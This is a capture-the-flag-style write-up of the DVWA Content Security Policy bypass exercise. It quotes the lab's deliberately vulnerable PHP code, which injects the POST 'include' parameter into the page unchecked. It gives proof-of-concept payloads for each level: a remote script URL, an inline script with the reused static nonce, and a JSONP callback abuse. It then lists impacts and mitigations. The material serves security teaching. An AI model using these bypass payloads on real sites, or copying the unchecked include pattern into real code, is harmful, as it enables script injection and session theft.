# 🔓 DVWA – Content Security Policy (CSP) Bypass Analysis

This writeup provides a professional, structured, and consistent analysis of the **Content Security Policy (CSP) Bypass** vulnerability at all three DVWA security levels: **Low**, **Medium**, and **High**.

---

## 🔢 Input Code

### 🟢 Low Security Level

```php
$headerCSP = "Content-Security-Policy: script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com https://digi.ninja ;";
header($headerCSP);

if (isset ($_POST['include'])) {
$page[ 'body' ] .= "<script src='" . $_POST['include'] . "'></script>";
}
```

### 🟡 Medium Security Level

```php
$headerCSP = "Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';";
header($headerCSP);
header ("X-XSS-Protection: 0");

if (isset ($_POST['include'])) {
$page[ 'body' ] .= $_POST['include'];
}
```

### 🔴 High Security Level

```php
$headerCSP = "Content-Security-Policy: script-src 'self';";
header($headerCSP);

if (isset ($_POST['include'])) {
$page[ 'body' ] .= $_POST['include'];
}
```

---

## 📌 Overview

CSP is designed to prevent XSS by controlling which scripts can be loaded or executed. In DVWA's **CSP Bypass exercise**, the goal is to execute JavaScript despite increasingly restrictive CSP rules.

At each level:
- **Low** allows remote script inclusion from several sources.
- **Medium** requires using a specific nonce to inject inline scripts.
- **High** only allows self-hosted scripts, requiring abuse of JSONP or logic flaws in `high.js`.

---

## 🔍 Vulnerabilities Identified

```text
🔒 Vulnerability                         | ❌ Problem Description
----------------------------------------|-------------------------------------------------------------
External Script Injection (Low)         | User input directly included as a script source without validation.
Inline Script Injection (Medium)        | CSP allows 'unsafe-inline' and static nonce, making bypass trivial.
DOM-based XSS via JSONP (High)          | Hardcoded self-only CSP but external JSONP endpoint is abusable.
Missing Input Validation (All)          | No sanitization or content-type checks on `include` parameter.
```

---

## 2️⃣ Exploitation Phase: Manual or Automated

### 🔨 Tool: Browser or Burp Suite

### 🔧 Setup:
- Access DVWA on all three security levels.
- Identify CSP header and behavior.
- Prepare script payload or URL based on allowed sources.

### 🔁 Payloads:

#### 🔹 Low Level
```html
https://digi.ninja/dvwa/alert.js
```

#### 🔸 Medium Level
```html
<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script>
```

#### 🔴 High Level
Use the vulnerable `jsonp.php` and `high.js`:
```js
<script src="source/jsonp.php?callback=alert"></script>
```

### 🎯 Success Indicators:
- Alert box appears.
- CSP header does not block script.
- Script runs in the browser console.

---

## 4️⃣ Risk & Real-World Impact

```text
🧠 Exploit Impact                  | 🎯 Description
----------------------------------|-------------------------------------------------------------
Session Hijacking                 | Malicious script could read cookies or tokens.
Data Exfiltration via Scripts     | Attacker-controlled domains can steal sensitive data.
Security Policy Misconfiguration | Developers might believe CSP is fully protective when it’s bypassed.
Credential Theft / Phishing      | DOM-based or stored XSS payloads lead to account takeover.
```

---

## 5️⃣ 🚧 Mitigation Measures (Secure Coding)

```text
🚫 Vulnerability                          | ✅ Mitigation
-----------------------------------------|-------------------------------------------------------------
Remote script inclusion (Low)            | Avoid dynamic script insertion. Use static URLs.
Nonce reuse (Medium)                     | Generate fresh nonce per request. Avoid static or hardcoded values.
Improper JSONP use (High)                | Remove or sanitize JSONP support. Use CORS + strict MIME checks.
Lack of input validation                 | Sanitize `include` using allowlist and enforce correct content types.
CSP misconfiguration                     | Apply strict CSP: no `unsafe-inline`, no open domains, use hashes.
```

---

✅ This writeup is part of the **Software and Web Application Security Crash Course** – providing practical, real-world insights into web exploitation and defense.